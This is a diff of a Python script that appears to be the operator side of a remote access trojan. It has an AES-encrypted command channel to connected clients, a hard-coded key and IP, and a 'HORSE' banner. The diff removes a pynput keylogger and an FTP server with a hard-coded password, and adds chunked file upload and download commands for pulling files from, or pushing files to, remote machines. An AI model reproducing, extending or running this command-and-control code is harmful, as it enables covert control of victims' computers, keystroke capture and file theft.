@@ -5,7 +5,6 @@ import os
 import time
 import sys
 import logging
-# from pynput import keyboard
 from tabulate import tabulate
 from pyftpdlib.authorizers import DummyAuthorizer
 from pyftpdlib.handlers import FTPHandler
@@ -13,17 +12,13 @@ from pyftpdlib.servers import ThreadedFTPServer
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad,unpad
 
-Host = "192.168.30.52"
+Host = "192.168.140.65"
 Port = 6565
 client_list=[]
 address_list = []
-line_buffer = ""
 aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'
 
 
-class ftpserver:
-    ftp_username = "Necati"
-    ftp_password = "P;F3nj+qXp.N^H8!*=$#kl"
 
 
 class colour:
@@ -104,22 +99,6 @@ HORSE ="""
 
 
 
-def ftp_server():
-    authorizer = DummyAuthorizer()
-    authorizer.add_user(ftpserver.ftp_username, ftpserver.ftp_password, "./Data/ftp", perm="elradfmw")
-    handler = FTPHandler
-    handler.authorizer = authorizer
-    logging.basicConfig(level=logging.INFO,
-                        filename='./Data/log/ftp_server.log',
-                        format='%(asctime)s - %(levelname)s - %(message)s')
-
-    # Suppress logging to terminal
-    logging.getLogger().setLevel(logging.INFO)
-    server = ThreadedFTPServer(("0.0.0.0", 21), handler)
-    server.serve_forever()
-    while True:
-        if not data_collection:
-            server.close_when_done()
 
 
 
@@ -138,10 +117,6 @@ def start_data_read():
     data_collection = True
     data_reloader = threading.Thread(target=data_read)
     data_reloader.start()
-    # key_log =threading.Thread(target=keylogs)
-    # key_log.start()
-    ftp_thread = threading.Thread(target=ftp_server,daemon=True,name="FTP")
-    ftp_thread.start()
 
 def stop_data_read():
     global data_collection
@@ -208,44 +183,64 @@ def check_hostname(HostName,client):
 
 
 
-
-
-
-def keylogs():
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-        
-def on_press(key):
-    global line_buffer
-    try:
-        if  key == keyboard.Key.space :
-            line_buffer += " "
-        elif key == keyboard.Key.backspace:
-            line_buffer = line_buffer [:-1]
-        else:
-            key_char = key.char
-            line_buffer += key_char
-    except AttributeError as e:
-        pass
-    
-def on_release(key):
-    global line_buffer
-    if key == keyboard.Key.enter:
-        line_buffer = ""  
-    if not data_collection :
-        return False
-
 def output(hello):
     sys.stdout.write(colour.info(f"\r\u001b[1000D{hello}                                         \n"))
-    # if line_buffer != "":
-    #     print(f"{colour.CC} {colour.help} {colour.arrow} {line_buffer}",end="",flush=True);print("\033[0m",end='')
     history_saver(hello)
 
 
 
 
 
+def ftp(command,client):
+    tip = command[1]
+    file = command[2]
 
+
+    def write(file,data):
+        with open(file,'wb') as f:
+            f.write(data)
+
+
+
+    def read(file):
+        with open(file,'rb') as f:
+            return f.read() 
+        
+
+    def parse_chunks(data, chunk_size=409600):
+        chunks = []
+        for i in range(0, len(data), chunk_size):
+            if i+ chunk_size < len(data):
+                chunks.append(data[i:i + chunk_size])
+            else : 
+                chunks.append(data[i:len(data)])
+        return chunks
+    
+
+    def download(file,client):
+        size = int(client.recv(4096).decode('utf-8'))
+        data = []
+        client.send(b"ready")
+        for i in range(size):
+            chunk = client.recv(409600)
+            data.append(chunk)
+        binary_data = b''.join(data)  
+        write(f"./Data/ftp/{file}",binary_data)
+
+    def upload(file,client):
+        file = read(f"./Data/ftp/{file}")
+        parse_file =parse_chunks(file)
+        client.send(str(len(parse_file)).encode('utf-8'))
+        client.recv(409600)
+        for chunk in parse_file:
+            client.send(chunk)
+
+
+
+    if tip == "-d":
+        download(file,client)
+    elif tip == "-u":
+        upload(file,client)
 
 
 
@@ -273,6 +268,18 @@ def connect(NickName):
                         os.system('cls' if os.name == 'nt' else 'clear')
                     elif command != "":
                         break
+                    elif command[0:3] == "ftp":
+                        ftp_command = command.split()
+                        if len(ftp_command) == 3:
+                            enc = encrypt_data(command.encode('utf-8'))
+                            client.send(enc)
+                            ftp(ftp_command,client)
+                            output = f"{decrypt_data(client.recv(4096000)).decode('utf-8')}"
+                            print(output,end="")
+                            log_saver(HostName,output)
+                        else:
+                            print(colour.info("[*] Wrong command."))
+                        continue
                 enc = encrypt_data(command.encode('utf-8'))
                 client.send(enc)
                 output = f"{decrypt_data(client.recv(4096000)).decode('utf-8')}"
